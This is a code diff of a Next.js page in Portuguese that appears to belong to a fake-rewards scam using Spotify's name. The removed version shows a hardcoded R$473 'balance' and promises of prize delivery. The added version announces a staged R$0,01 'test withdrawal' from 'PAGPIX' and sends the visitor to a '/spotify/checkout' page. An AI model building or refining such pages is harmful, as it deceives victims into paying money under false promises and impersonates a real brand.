@@ -1,53 +1,31 @@
-import Image from "next/image";
-import Logo from '@/assets/logo-green.png'
-import { cookies } from "next/headers";
-import { Details } from "./details";
+import { CheckCircle } from "lucide-react";
+import Link from "next/link";
 
 export default function StatusPage() {
 
-
-  const name = cookies().get('user_name')
-
   return (
-    <div className="w-full relative min-h-screen bg-[#181818] text-white">
-      <div className="sticky z-50 top-0 left-0 right-0 h-16 bg-black flex items-center justify-between p-5">
-        <Image src={Logo} className='object-contain' width={100} height={30} alt='logo' priority />
+    <div className="w-full flex items-center justify-center flex-col min-h-screen bg-[#01D661] text-white space-y-6">
 
-        <div className='bg-[#01D661] rounded-2xl flex items-center gap-1 p-2 text-black'>
-          <span className='text-sm font-semibold'>Saldo: </span>
-          <span className='text-sm font-semibold'>{new Intl.NumberFormat('pt-BR', {
-            style: 'currency',
-            currency: 'BRL'
-          }).format(473)}</span>
-        </div>
+      <div className="space-y-8 flex flex-col justify-center items-center">
+        <CheckCircle className="size-36 text-black" />
 
+        <h2 className="text-black font-semibold text-2xl text-center">PIX cadastrado!</h2>
       </div>
 
-      <div className='w-full p-5'>
-        <div className='w-full bg-black rounded-lg p-5 space-y-8'>
-
-          <h2 className='text-2xl font-bold text-center'>Olá, {name?.value.toUpperCase().split(" ")[0]}!</h2>
+      <p className="text-sm text-[#181818] text-center">Você recebeu o seu saque teste de <span className="font-semibold">R$ 0,01 CENTAVO</span> em nome de <span className="font-semibold">"PAGPIX"</span>. Verifique suas notificações ou extrato bancário!</p>
 
 
-          <p className="text-center text-white font-bold pt-10">
-            Já estamos finalizando todo o processo de entrega dos seus prêmios, fica tranquilo enquanto finalizamos todos os envios para você!
-          </p>
+      <p className="text-sm text-[#181818] text-center">Agora basta <span className="font-semibold">realizar</span> seu <span className="font-semibold">1° saque!</span></p>
 
 
-          <Details />
-
-
-
-          <p className="text-center text-xs text-[#a8a8a8] pt-10">
-            Este site é protegido pelo reCAPTCHA e está sujeito à <b className="text-[#01d661]">Política de Privacidade</b> e aos <b className="text-[#01d661]">Termos de Serviço do Spotify ®.</b>
-          </p>
-
-        </div>
+      <div className="w-full flex items-center justify-center">
+        <Link
+          className="w-full max-w-[300px] duration-1000 text-white animate-btn bg-[#181818] rounded-3xl h-12 font-bold flex items-center justify-center transition-opacity opacity-100"
+          href="/spotify/checkout"
+        >
+          CONTINUAR & RECEBER
+        </Link>
       </div>
-
-
-
-
     </div>
   )
 }
